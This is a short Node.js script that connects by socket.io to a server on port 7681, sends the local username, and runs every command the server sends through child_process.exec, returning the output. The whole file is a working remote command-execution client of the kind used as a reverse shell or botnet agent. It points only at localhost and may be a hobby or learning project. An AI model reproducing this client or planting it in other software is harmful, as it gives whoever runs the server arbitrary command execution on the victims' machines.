const PORT = 7681;
const { exec } = require("child_process");
const io = require("socket.io-client");

const connectionAddr = "http://localhost";
const socket = io.connect(`${connectionAddr}:${PORT}`, {
  reconnection: true,
});

let USER = "";

exec("echo $USER", (err, stdout, stderr) => {
  if (err) console.log("There was a node error: ", err);
  if (stderr) console.log("There was a bash error: ", stderr);
  else USER = stdout;
});

socket.on("connect", () => {
  log("info", "Connected to server");
  socket.emit("new-user", USER);
});

socket.on("perform-command", (command) => {
  log("command", `${command}`);
  let result = "";
  exec(command, (err, stdout, stderr) => {
    if (err) result = err;
    else if (stderr) result = stderr;
    else result = stdout;

    log("result", `${result}`);
    socket.emit("performed-command", {
      command: command,
      result: result,
    });
  });
});

function log(title, message) {
  console.log(`[${title.toUpperCase()}] ${message}`);
}
